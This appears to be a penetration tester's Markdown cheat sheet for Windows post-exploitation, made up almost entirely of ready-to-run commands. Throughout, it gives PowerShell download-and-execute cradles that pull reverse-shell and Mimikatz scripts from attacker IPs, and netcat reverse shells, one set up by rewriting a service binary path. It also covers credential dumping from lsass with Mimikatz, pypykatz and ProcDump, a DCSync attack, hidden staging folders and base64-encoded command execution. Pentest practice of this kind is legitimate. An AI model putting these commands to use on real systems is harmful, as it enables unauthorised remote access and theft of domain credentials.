

- [File Transfer To Windows](#file-transfer-to-windows)
- [Checking File permissions](#checking-file-permissions)
- [Changing Service Path](#changing-service-path)
- [Mimikatz to dump creds](#mimikatz-to-dump-creds)
- [Checking Administrator Perms with Powershell](#checking-administrator-perms-with-powershell)
- [Running specific powershell script](#running-specific-powershell-script)
- [Shares on Windows](#shares-on-windows)
  - [CMD](#cmd)
  - [PowerShell](#powershell)
- [Dumping Credentials from lsass.exe Mimikatz.ps1](#dumping-credentials-from-lsassexe-mimikatzps1)
- [DC Sync Attack with Mimikatz](#dc-sync-attack-with-mimikatz)
- [Mimikatz with memory dump](#mimikatz-with-memory-dump)
- [Enumerating Windows Services](#enumerating-windows-services)
  - [CMD](#cmd-1)
  - [Powershell](#powershell-1)
  - [Dumping programs and searching the .dmp file (ProcDump)](#dumping-programs-and-searching-the-dmp-file-procdump)
- [Base64 in PowerShell](#base64-in-powershell)

### File Transfer To Windows
```powershell
# Useful directories
C:\\Temp\\.hidden
C:\\windows\\system32\\spool\\drivers\\color\\.hidden

# Prefix the invoke command with the following to speed up download
powershell.exe $ProgressPreference = 'SilentlyContinue'; 

# Download item
Invoke-WebRequest http://$IP/<FILE> -OutFile <FILE> # download and specify output

powershell -command "IEX(New-Object Net.webClient).DownloadString('http://10.10.14.30/Invoke-PowerShellTcp')" # download string

powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.18:8000/Invoke-PowerShellTcp','.\Invoke-PowerShellTcp')" # download and specify output

powershell -command "IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')" # download and execute PS1

# Extract zip with Powershell (unzip)
powershell -command "Expand-Archive .\COMPILE.zip -DestinationPath .\"
```

```bash
# Upload with curl
curl -s -k -u <USER>:<PASS> -X PUT https://$IP/<FILE> --data-binary @<FILE> 
curl -s -k -u <USER>:<PASS> -X PUT https://$IP/<FILE> --data-binary "C:\Temp\nc64.exe <your_ip> <port> -e cmd.exe"
```

### Checking File permissions
```cmd
whoami /groups
.\accesschk.exe -uwcqv "NT AUTHORITY\SERVICE" * /accepteula
```

### Changing Service Path
```cmd
sc.exe config <SERVICE> bin="cmd /c start C:\Location\To\nc64.exe -e cmd $IP <PORT>"
sc.exe start <SERVICE>
```

### Mimikatz to dump creds
```bash
./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
pypykatz lsa minidump lsass.DMP # Grabbing creds from a dump with pypykatz

mimikatz# sekurlsa::minidump lsass.DMP
mimikatz# sekurlsa::logonPasswords full
```

### Checking Administrator Perms with Powershell
```powershell
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
```



### Running specific powershell script
```powershell
powershell -noprofile -executionpolicy unrestricted -file install.ps1
```

### Shares on Windows
#### CMD
```batch
:: NOTE: a REM is a comment

:: View current network connections
net use

:: Add and mount share to X
net use X: \\<IP>\<SHARE_NAME> /USER:<USER> <PASSWORD> /PERSISTENT:YES
::example
net use X: \\10.10.14.18\share /user:guest guest
\\10.10.14.18\share\nc.exe -e cmd.exe 10.10.14.18 31336

:: Delete and unmount share on X
net use X: /delete

:: Delete cached Share credentials (explorer.exe may need to be reset)
net use * /d 

```

#### PowerShell
```powershell
### TODO ###
```

### Dumping Credentials from lsass.exe Mimikatz.ps1
```powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds

# Via a different version of powershell
powershell -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds


# The command needed is:
sekurlsa::logonpasswords full
```

### DC Sync Attack with Mimikatz
```powershell
./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
```

### Mimikatz with memory dump 
(use Sysinternal's ProcDump for this task)
```powershell
# Memory dump of process with Procdump (target a high priv application)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp # where -ma writes a dump file with all process memory of lsass.exe

# With pypykatz
pypykatz lsa minidump lsass.DMP

# With mimikatz
.\mimikatz.exe "sekurlsa::minidump C:\Temp\Desktop\lsass.dmp" "sekurlsa::logonPasswords" "exit" # external

sekurlsa::minidump lsass.DMP # if entering mimikatz
sekurlsa::logonPasswords full # if entering mimikatz
```

### Enumerating Windows Services
#### CMD
```batch
:: TODO ::
```

#### Powershell
```powershell
# service enumeration
Get-Service
Get-Process -name *
ps
# TODO # (WITH WMIC)
```

#### Dumping programs and searching the .dmp file (ProcDump)
```powershell
.\procdump.exe -accepteula -ma <PID>

.\strings.exe -accepteula <FILE>.dmp | findstr <SEARCH_TERM>

```

### Base64 in PowerShell
```powershell
# TO BASE64 ENCODING
$Command = "whoami"
$Encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command)) 
Write-Output $Encoded

# TO PLAINTEXT
$Command = "dwBoAG8AYQBtAGkA"
$Plaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Command)) # alternate command
Write-Output $Plaintext

# Execute
powershell.exe -E $ENCODED
powershell.exe /e $ENCODED
powershell.exe -EncodedCommand $ENCODED
```
* Additional Resource: https://raikia.com/tool-powershell-encoder/
